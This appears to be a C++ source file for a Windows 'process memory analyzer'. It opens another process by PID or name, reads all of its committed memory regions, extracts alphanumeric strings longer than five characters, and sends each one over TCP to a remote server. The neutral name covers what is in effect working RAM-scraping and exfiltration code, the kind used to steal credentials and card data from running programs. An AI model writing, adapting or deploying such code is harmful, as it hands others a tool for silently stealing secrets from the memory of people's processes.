#include "ProcessMemoryAnalyzer.h"

#include <iostream>
#include <algorithm>
#include <vector>
#include <TlHelp32.h>

#include "TcpClient.h"

#define PROC_MEM_ANALYZER_MAX_ALLOC_PAGE_SIZE					0x100000

using namespace std;

CProcessMemoryAnalyzer::CProcessMemoryAnalyzer(CTcpClient* pServerEndpoint, const int iPid) :
	m_pServerEndpoint(pServerEndpoint),
	m_hProcToAnalyze(NULL)
{
	if (!InitProcessMemoryAnalyzer(iPid))
	{
		throw exception("Error initializing process memory analyzer");
	}
}

CProcessMemoryAnalyzer::CProcessMemoryAnalyzer(CTcpClient* pServerEndpoint, wstring& wstPname) :
	m_pServerEndpoint(pServerEndpoint),
	m_hProcToAnalyze(NULL)
{
	const int iPid = FindProcessIdByProcessName(wstPname);
	
	if (!InitProcessMemoryAnalyzer(iPid))
	{
		throw exception("Error initializing process memory analyzer");
	}
}

/*virtual*/ CProcessMemoryAnalyzer::~CProcessMemoryAnalyzer()
{
	if (m_hProcToAnalyze != NULL)
	{
		CloseHandle(m_hProcToAnalyze);
	}
}

bool CProcessMemoryAnalyzer::InitProcessMemoryAnalyzer(int iPid)
{
	bool bResult = false;

	m_hProcToAnalyze = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, false, iPid);
	bResult = (m_hProcToAnalyze != NULL);

	return bResult;
}

DWORD CProcessMemoryAnalyzer::FindProcessIdByProcessName(std::wstring& wstPname)
{
	DWORD dwResult = 0;

	HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;

	//Take a snapshot of all processes in the system.
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap != INVALID_HANDLE_VALUE) 
	{
		pe32.dwSize = sizeof(PROCESSENTRY32);

		if (Process32First(hProcessSnap, &pe32))
		{
			transform(wstPname.begin(), wstPname.end(), wstPname.begin(), towlower);
			wstring wstCurrentProcName;
			
			do
			{
				wstCurrentProcName = wstring(pe32.szExeFile);
				transform(wstCurrentProcName.begin(), wstCurrentProcName.end(), wstCurrentProcName.begin(), towlower);

				if (wstPname == wstCurrentProcName)
				{
					dwResult = pe32.th32ProcessID;
					break;
				}
			}
			while (Process32Next(hProcessSnap, &pe32));
		}
		
		CloseHandle(hProcessSnap);
	}

	return dwResult;
}

DWORD CProcessMemoryAnalyzer::GetSystemPageSize()
{
	DWORD dwResult = 0;

	SYSTEM_INFO si;
    GetSystemInfo(&si);
	dwResult = si.dwPageSize;

	return dwResult;
}

void CProcessMemoryAnalyzer::Analyze()
{
	if (m_hProcToAnalyze)
	{
		unsigned char* pBase = NULL;
		MEMORY_BASIC_INFORMATION info;
		size_t szBytesRetured = 0;
		vector<byte> vecData;
		DWORD dwBytesRead = 0;
		const DWORD dwPageSize = GetSystemPageSize();

		szBytesRetured = VirtualQueryEx(m_hProcToAnalyze, pBase, &info, sizeof(info));

		while (szBytesRetured == sizeof(info))
		{
			//for each commited mem regaion which doesn't exceed predefined size boundary
			if ((info.State == MEM_COMMIT) && (info.RegionSize < PROC_MEM_ANALYZER_MAX_ALLOC_PAGE_SIZE))
			{
				vecData.clear();
				vecData.resize(info.RegionSize);

				if (ReadProcessMemory(m_hProcToAnalyze, pBase, &vecData[0], info.RegionSize, &dwBytesRead))
				{
					//cout << "memory range of size " << dwBytesRead << " has been read" << endl;

					AnalyzeAscii(&vecData[0], dwBytesRead);
					AnalyzeUnicode(&vecData[0], dwBytesRead);
				}
			}

			pBase += info.RegionSize;
			szBytesRetured = VirtualQueryEx(m_hProcToAnalyze, pBase, &info, sizeof(info));
		}
	}
}

void CProcessMemoryAnalyzer::AnalyzeAscii(const byte* pBuf, const DWORD dwBufSize)
{
	const byte* pBufEnd = pBuf + dwBufSize;
	byte* pStart = (byte*)pBuf;
	byte* pEnd = NULL;
	int iWordLen = 0;
	string stWord;

	while (pStart < pBufEnd)
	{
		while ((pStart < pBufEnd) && !(IsAsciiPrintableChar(*pStart)))
		{
			pStart++;
		}

		if (pStart < pBufEnd)
		{
			pEnd = pStart;
			while ((pEnd < pBufEnd) && (IsAsciiPrintableChar(*pEnd)))
			{
				pEnd++;
			}

			iWordLen = (pEnd - pStart);

			if (iWordLen > 5)
			{
				stWord = string((const char*)pStart, iWordLen);
				stWord += '\n';

				m_pServerEndpoint->SendData(stWord);
				//cout << "found word: " << stWord << endl;
			}

			pStart = pEnd;
		}
	}
}

void CProcessMemoryAnalyzer::AnalyzeUnicode(const byte* pBuf, const DWORD dwBufSize)
{
	const WCHAR* pBufEnd = (WCHAR*)(pBuf + dwBufSize);
	WCHAR* pStart = (WCHAR*)pBuf;
	WCHAR* pEnd = NULL;
	int iWordLen = 0;
	wstring wstWord;

	while (pStart < pBufEnd)
	{
		while ((pStart < pBufEnd) && !(IsUnicodePrintableChar(*pStart)))
		{
			pStart++;
		}

		if (pStart < pBufEnd)
		{
			pEnd = pStart;
			while ((pEnd < pBufEnd) && (IsUnicodePrintableChar(*pEnd)))
			{
				pEnd++;
			}

			iWordLen = (pEnd - pStart);

			if (iWordLen > 5)
			{
				wstWord = wstring((const WCHAR*)pStart, iWordLen);
				wstWord += L'\n';

				m_pServerEndpoint->SendData(wstWord);
				//cout << "found word: " << stWord << endl;
			}

			pStart = pEnd;
		}
	}
}

bool CProcessMemoryAnalyzer::IsAsciiPrintableChar(const byte chByte)
{
	bool bResult = false;

	//bResult = (isprint(chByte));
	bResult = (chByte >= '0' && chByte <= '9') || (chByte >= 'a' && chByte <= 'z') || (chByte >= 'A' && chByte <= 'Z');

	return bResult;
}

bool CProcessMemoryAnalyzer::IsUnicodePrintableChar(const WCHAR wchChar)
{
	bool bResult = false;

	//bResult = (iswprint (wchChar));
	bResult = (wchChar >= L'0' && wchChar <= L'9') || (wchChar >= L'a' && wchChar <= L'z') || (wchChar >= L'A' && wchChar <= L'Z');

	return bResult;
}
